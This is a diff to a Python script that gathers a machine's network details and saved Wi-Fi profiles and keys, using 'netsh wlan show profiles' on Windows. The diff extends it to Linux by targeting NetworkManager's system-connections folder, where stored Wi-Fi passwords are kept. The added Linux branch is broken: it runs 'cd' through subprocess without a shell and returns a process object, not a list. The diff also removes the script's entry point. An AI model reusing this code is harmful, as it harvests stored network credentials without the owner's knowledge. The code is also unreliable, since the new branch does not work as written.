@@ -5,7 +5,7 @@ import subprocess
 import os
 from os import environ
 
-SUPPORTED_PLATFORMS = ['Windows']
+SUPPORTED_PLATFORMS = ['Windows' , 'Linux']
 
 PLATFORM_IS_SUPPORTED = False
 
@@ -42,22 +42,24 @@ def get_ipconfig():
 def get_user_profiles():
     if platform.system() == 'Windows':
         try:
-            user_profiles = subprocess.run('netsh wlan show profiles' , capture_output=True , text=True)
-            superset = re.split( r'\s' , user_profiles.stdout)
+            w_user_profiles = subprocess.run('netsh wlan show profiles' , capture_output=True , text=True)
+            superset = re.split( r'\s' , w_user_profiles.stdout)
             pointer = 0
-            _user_profiles = []
+            w_user_profiles = []
             while pointer < len(superset):
-                if superset[pointer-6] == 'Profile': _user_profiles.append(superset[pointer])
+                if superset[pointer-6] == 'Profile': w_user_profiles.append(superset[pointer])
                 pointer += 1
-            return _user_profiles
+            return w_user_profiles
         except:
             exit_r('[-] Failed to get user profiles')
     
     elif platform.system() == 'Linux':
-        #try:
-        return ['']
-        #except:
-           # exit_r('[-] Failed to get user profiles')
+        try:
+            l_user_profiles = subprocess.run('cd /etc/NetworkManager/system-connections/*' , capture_output=True , text=True)
+            return l_user_profiles
+            
+        except:
+            exit_r('[-] Failed to get user profiles')
 
 def get_keys(profiles):
     if platform.system() == 'Windows':
@@ -100,6 +102,3 @@ def main():
     if PLATFORM_IS_SUPPORTED:
         save_all_data()
         exit_r('\n[+] Process ended.')
-
-if __name__ == '__main__':
-    main()
